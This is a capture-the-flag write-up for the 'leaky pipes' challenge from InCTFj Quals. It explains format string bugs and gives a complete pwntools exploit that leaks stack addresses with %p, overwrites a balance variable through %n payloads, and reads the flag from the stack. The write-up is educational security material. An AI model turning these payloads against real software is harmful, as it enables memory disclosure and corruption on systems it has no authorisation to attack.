---
layout: post
author: tourpran
title: Leaky pipes - InCTFj Quals
categories: writeup
tags: ["pwn", "format string"]
---

### Intro:
Played InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called ``leaky pipes``. Make sure to give the challenge a try before seeing this.

### Challenge file:
[vuln binary](/assets/leakyinctfj/leaky_pipes) and 
[vuln c code](/assets/leakyinctfj/leaky.c)

### Pre requisites:
* Basic understanding of how computers work.
* Know what format strings are.
* will to learn more from googling.

### Mitigations:

![](/assets/leakyinctfj/ss1.png)

* Most of the format string exploitation will have all the mitigations enabled.
* RELRO: GOT related stuff.
* Stack Canary: unique value stoping buffer overflow.
* NX: Makes the stack not excecutable.
* PIE: the binary will have different address during different runs.

### Sample run:
Lets simply run the binary, while doing this make sure to read the c code and get comfortable with the binary as a whole.

![](/assets/leakyinctfj/ss2.png)

* We can give three options (1, 2, 3) but 2 options doesnt do anything. 
* option 1: Give an input and get same output back from the printf function.
* option 3: Currently unavailable since we dont have enough cash.

### Exploit Basics:
Format string exploitation occurs when you use the printf function carelessly. Correct Usage of printf will be to use the format strings/ format specifiers in the first part and all the parameters in the 2nd part. 
```c
printf("my name is : %s\n", "giovanni giorgio");
```
Problem occurs when attackers are given access to these format strings part. So as an attacker he can specify formats which will try to retrieve values that are not specified, hence will take values from the stack. Incorrect usage.
```c
printf(buffer); //buffer = user input
```

### Exploit Idea:
We have to somehow go to the use_tape() Since it has our flag and another format string exploit.

```c
void use_tape(){
	char experience[50];
	char flag[50];

	FILE *fp;
	fp = fopen("flag.txt", "rb");
	if(fp != NULL){
		fgets(flag, 50, fp);
		fclose(fp);

		printf("Please give us your feedback!\n");
		fgets(experience, 50, stdin);
		printf(experience);
		exit(0);
	}
	else{
		printf("Error opening file!\n");
		exit(1);
}
```

But the small caviat is we can't go there directly we somehow have to increase our balance from 100 to 200 (exactly) and then call `buy_repair_kit()`.

```c
void buy_repair_kit(){
    if(bal == 200){
        use_tape();
    }
    else{
        printf("You do not have enough balance! :(\n");
    }
}
```

### Format string 1:

First I leak the entire stack(useful range) with the help of %p (gives the hexadecimal value of what is in the stack). 
```py
p.sendline(b"-%p"*50)
leak = p.recvline()
leak = leak.split(b"-")
```
Sending many %p with the '-' acting as a delimiter between all the values leaked from the stack. (easy to split and put them in a list). If we play around with this then we notice that some of the values from the leaked data is similar to the binary's address. Checking the VA space, we find that the value leaked from the %p was indeed from the binary. (underlined)

![](/assets/leakyinctfj/ss4.jpg)

![](/assets/leakyinctfj/ss3.png)

> fact to know: When PIE is enabled the entire binary changes its place but the relative address of functions and variables remain same.

Pick one of the address that you like which is in the range of the binary and calculate the offset between this address and the bal variable. I took the 21st index as the leak and calculate the offset between bal and leak(10974).

```py
baladd = int(leak[21], 16)+10974
log.info(f"bal address: {hex(baladd)}")
```

### Format string 2:

Well! part 1/3 is over and it was just the easy part. Now comes the tricky part, I wasted hours trying to find a way to make the bal variable = 200. Finally I came upon a solution after hours of googling.
I call the leak function and give the string to overwrite the bal variable.
```
p.sendline(b"%99c%9$n%90c%9$n%11c%9$n" + p64(baladd))
``` 
Let me explain in parts what it does.

While doing a format string exploit to overwrite a variable or a function address... Check where your input is appearing and keep note of the index.

![](/assets/leakyinctfj/ss5.jpg)

Here my string of `AAAAAAAA` repeats in the index 6. Now its just a matter of overwriting the variable. But... wait. How to overwrite ? we sure dont have no buffer overflow, can printf be used to overwrite ? da flick ?

![](/assets/leakyinctfj/ss5.png)

Yes! The format specifier %n will write the number of bytes read till now into the address specified. So things become simple, Just put 200 bytes put the address of the variable, so the value of 100 will change to 200. Is it that simple ? kinda yes. One more caviat is only 8 bytes are read and excecuted by the program at a time, So we slowly build up the no of bytes and the put the value into specifc address.

```
%[pad]c%[number]$n - would write that many `pad` of padding at the 9th offset in the leaked value.
```

```py
p.sendline(b"%99c%9$n%90c%9$n%11c%9$n" + p64(baladd)) #(c = character, $n = to write)
```

Above I have added (99+90+11) which gives 200 into 9th offset since the `p64(baladd)` will place the address of baladd in the 9th index from start.

### Format string 3:
Great job guys! Final part is damn simple just call the `buy_repair_kit()` function which now satify bal == 200 and call use_tape(), Here the flag is opened and just read into the stack followed by an unsafe printf leading to format string exploitation. Just leak most of the stack and get the flag. GG

### Full Exploit Script:
```py
#!/usr/bin/env python3
from pwn import *

context.update(arch='x86')
exe = './chall'
elf = ELF("./chall")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
# p = remote("gc1.eng.run", 32309)

#Leaking the bal variable address
p.recv()

p.sendline(b"1")
p.recvuntil(b"like to check your leaks?")
p.sendline(b"-%p"*50)
p.recvline()
leak = p.recvline()
leak = leak.split(b"-")

baladd = int(leak[21], 16)+10974
log.info(f"bal address: {hex(baladd)}")

#Over write bal with 200 to bypass the check
p.sendline(b"1")
p.recv()
p.sendline(b"%99c%9$n%90c%9$n%11c%9$n" + p64(baladd))
p.recv()

#Leak the flag from the stack since its opened
p.sendline(b"3")
p.recvuntil(b"feedback!")
p.sendline(b"%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p")
p.recvline()

#Change the hex flag to ascii
flag = p.recvline().split(b"-")
final = ""

for hexval in flag:
    try:
        final += (str(bytes.fromhex(str(hexval)[4:-1]).decode('utf-8'))[::-1])
    except:
        continue

final += "ng!!}"
log.info(f"flag: {final}")

p.interactive()
```
![](/assets/leakyinctfj/ss6.png)

Happy Hacking!